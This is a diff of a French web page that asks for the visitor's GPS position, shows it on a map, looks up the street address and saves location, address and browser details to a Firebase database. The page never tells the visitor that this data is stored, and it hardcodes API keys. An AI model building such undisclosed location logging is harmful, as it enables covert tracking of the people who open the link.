@@ -2,42 +2,22 @@
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
-<title>Live Position</title>
+<title>GPS</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 
 <style>
-body {
-  margin:0;
-  font-family: Arial;
-  background:#0f172a;
-  color:white;
-  text-align:center;
-}
-
-button {
-  margin-top:20px;
-  padding:14px;
-  font-size:18px;
-  border:none;
-  border-radius:10px;
-  background:#3b82f6;
-  color:white;
-}
-
-#map {
-  height:60vh;
-  margin-top:20px;
-}
+body { margin:0; background:#0f172a; color:white; text-align:center; font-family:Arial; }
+button { margin:20px; padding:15px; font-size:18px; border:none; border-radius:10px; background:#3b82f6; color:white; }
+#map { height:60vh; }
 </style>
 </head>
 
 <body>
 
-<h2>📍 Partager ma position</h2>
-
-<button id="btn">ACTIVER LA LOCALISATION</button>
+<h2>📍 Localisation</h2>
+<button onclick="start()">ACTIVER GPS</button>
 
 <p id="status">En attente...</p>
 <p id="address"></p>
@@ -46,110 +26,113 @@ button {
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
-<script type="module">
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+<script>
 
-// 🔑 REMPLACE ICI
-const firebaseConfig = {
+// ✅ TES VRAIES CLÉS
+firebase.initializeApp({
   apiKey: "AIzaSyAgwaKZKvLOW_GYpVirgywWETM4Kjz3dVQ",
   authDomain: "mymaponline-d4fcf.firebaseapp.com",
   projectId: "mymaponline-d4fcf",
-  storageBucket: "mymaponline-d4fcf.firebasestorage.app",
+  storageBucket: "mymaponline-d4fcf.appspot.com",
   messagingSenderId: "294259967332",
   appId: "1:294259967332:web:d81f81f5122ff5ef626671",
   measurementId: "G-4M4S7687W5"
-};
+});
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+const db = firebase.firestore();
 
-let map, marker;
+let map = null;
+let marker = null;
 
-document.getElementById("btn").addEventListener("click", async () => {
+function start() {
 
   const status = document.getElementById("status");
 
-  // 🔍 Vérification permission
-  if (navigator.permissions) {
-    try {
-      const perm = await navigator.permissions.query({ name: "geolocation" });
+  if (location.protocol !== "https:") {
+    status.innerText = "❌ PAS HTTPS";
+    return;
+  }
 
-      if (perm.state === "denied") {
-        status.innerText = "❌ GPS bloqué dans Chrome";
-        return;
-      }
-    } catch(e){}
+  if (!navigator.geolocation) {
+    status.innerText = "❌ GPS non supporté";
+    return;
   }
 
   status.innerText = "Demande GPS...";
 
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-
-    status.innerText = "✅ Position OK";
-
-    // 🗺️ MAP
-    if (!map) {
-      map = L.map('map').setView([lat, lon], 15);
-
-      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
-        .addTo(map);
-
-      marker = L.marker([lat, lon]).addTo(map);
-    } else {
-      map.setView([lat, lon]);
-      marker.setLatLng([lat, lon]);
-    }
-
-    // 🌍 GEOAPIFY
-    let address = "Inconnue";
-
-    try {
-      const res = await fetch(
-        `https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`
-      );
-
-      const data = await res.json();
-      address = data.features?.[0]?.properties?.formatted || "Inconnue";
-
-    } catch(e){}
-
-    document.getElementById("address").innerText = address;
-
-    // 🔥 FIREBASE
-    await addDoc(collection(db, "logs"), {
-      lat,
-      lon,
-      address,
-      userAgent: navigator.userAgent,
-      time: new Date().toISOString()
-    });
-
-  }, (err) => {
-
-    if (err.code === 1) {
-      status.innerText = "❌ Refusé par navigateur";
-    } else if (err.code === 2) {
-      status.innerText = "❌ Position indisponible";
-    } else if (err.code === 3) {
-      status.innerText = "❌ Timeout";
-    } else {
-      status.innerText = "❌ Erreur inconnue";
-    }
-
-    console.log(err);
-
-  }, {
+  navigator.geolocation.getCurrentPosition(success, error, {
     enableHighAccuracy: true,
-    timeout: 15000,
+    timeout: 20000,
     maximumAge: 0
   });
+}
 
-});
+async function success(pos) {
+
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
+
+  document.getElementById("status").innerText = "✅ GPS OK";
+
+  // MAP
+  if (!map) {
+    map = L.map('map').setView([lat, lon], 16);
+
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png')
+      .addTo(map);
+
+    marker = L.marker([lat, lon]).addTo(map);
+  } else {
+    map.setView([lat, lon]);
+    marker.setLatLng([lat, lon]);
+  }
+
+  // GEOAPIFY
+  let address = "Inconnue";
+
+  try {
+    const res = await fetch(
+      `https://api.geoapify.com/v1/geocode/reverse?lat=${lat}&lon=${lon}&apiKey=708354c5ad334d41b0611f73996998e1`
+    );
+
+    const data = await res.json();
+    address = data.features?.[0]?.properties?.formatted || "Inconnue";
+
+  } catch(e){}
+
+  document.getElementById("address").innerText = address;
+
+  // FIREBASE
+  db.collection("positions").add({
+    lat: lat,
+    lon: lon,
+    address: address,
+    userAgent: navigator.userAgent,
+    time: new Date().toISOString()
+  });
+}
+
+function error(err) {
+
+  const status = document.getElementById("status");
+
+  if (err.code === 1) {
+    status.innerText = "❌ REFUSÉ PAR NAVIGATEUR";
+  } else if (err.code === 2) {
+    status.innerText = "❌ POSITION INDISPONIBLE";
+  } else if (err.code === 3) {
+    status.innerText = "❌ TIMEOUT";
+  } else {
+    status.innerText = "❌ ERREUR";
+  }
+
+  console.log(err);
+}
+
 </script>
 
 </body>
